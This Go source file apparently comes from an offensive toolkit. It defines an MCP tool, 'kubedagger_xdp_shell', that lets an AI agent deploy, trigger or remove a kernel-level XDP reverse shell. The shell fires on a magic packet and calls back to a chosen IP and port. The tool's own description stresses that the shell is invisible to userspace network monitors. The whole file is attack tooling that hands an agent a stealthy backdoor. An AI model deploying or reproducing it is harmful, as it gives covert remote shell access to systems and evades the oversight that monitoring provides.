package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type XDPShellInput struct {
	Action    string `json:"action"`
	Interface string `json:"interface,omitempty"`
	Port      int    `json:"port,omitempty"`
	Secret    string `json:"secret,omitempty"`
	Callback  string `json:"callback,omitempty"`
}

type XDPShellTool struct {
	exec executor.Executor
}

func NewXDPShell(exec executor.Executor) *XDPShellTool {
	return &XDPShellTool{exec: exec}
}

func (t *XDPShellTool) Name() string { return "kubedagger_xdp_shell" }

func (t *XDPShellTool) Description() string {
	return "Deploy an XDP-based reverse shell that triggers on a specific magic packet. The shell operates entirely in kernel space for the trigger mechanism, making it invisible to userspace network monitors until activation."
}

func (t *XDPShellTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["deploy", "trigger", "remove", "status"],
				"description": "XDP shell action"
			},
			"interface": {
				"type": "string",
				"description": "Network interface to attach XDP program"
			},
			"port": {
				"type": "integer",
				"description": "Callback port for reverse shell"
			},
			"secret": {
				"type": "string",
				"description": "Magic packet secret for shell trigger"
			},
			"callback": {
				"type": "string",
				"description": "Callback IP address for reverse shell"
			}
		},
		"required": ["action"]
	}`)
}

func (t *XDPShellTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input XDPShellInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Interface, "interface"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Secret, "secret"); err != nil {
		return errorResult(err.Error()), nil
	}
	if input.Callback != "" {
		if err := validateIP(input.Callback); err != nil {
			return errorResult(err.Error()), nil
		}
	}

	args := []string{"xdp-shell", "--action", input.Action}
	if input.Interface != "" {
		args = append(args, "--interface", input.Interface)
	}
	if input.Port > 0 {
		args = append(args, "--port", fmt.Sprintf("%d", input.Port))
	}
	if input.Secret != "" {
		args = append(args, "--secret", input.Secret)
	}
	if input.Callback != "" {
		args = append(args, "--callback", input.Callback)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger xdp-shell failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger XDP Shell: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("Operation completed.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
